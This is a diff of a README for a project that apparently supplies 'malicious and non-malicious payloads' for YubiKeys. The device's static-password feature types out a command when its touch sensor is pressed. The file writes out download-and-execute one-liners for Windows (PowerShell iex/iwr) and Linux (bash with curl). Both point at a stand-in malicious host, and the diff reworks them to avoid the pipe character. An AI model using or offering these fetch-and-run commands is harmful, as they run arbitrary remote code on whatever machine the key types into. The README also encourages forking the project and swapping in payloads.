@@ -5,13 +5,14 @@ malicious and non-malicious payloads for yubikeys!
 ## Concept
 The concept is simple - you set a static password as a command, such as:
 ```
-curl -L malicous.example.com | pwsh                    (Windows)
+pwsh -c "iex(iwr malicous.example.com)"                (Windows)
 bash <(curl -L malicous.example.com)                   ( Linux )
 ```
 pointing to a payload. It then runs when you open a CMD/SH window, and press the touch sensor.
+(note how they both do not use pipe; this is to ensure compatibility with most keyboards)
 
 > [!NOTE]
-> This requires PowerShell to be installed. If you are on a hardened setup without PowerShell (or the pwsh alias), it will not work.
+> Windows' method requires PowerShell to be installed. If you are on a hardened setup without PowerShell (or the pwsh alias), it will not work.
 
 ## Excecution
 I recommend forking this, and then changing the payloads you need.
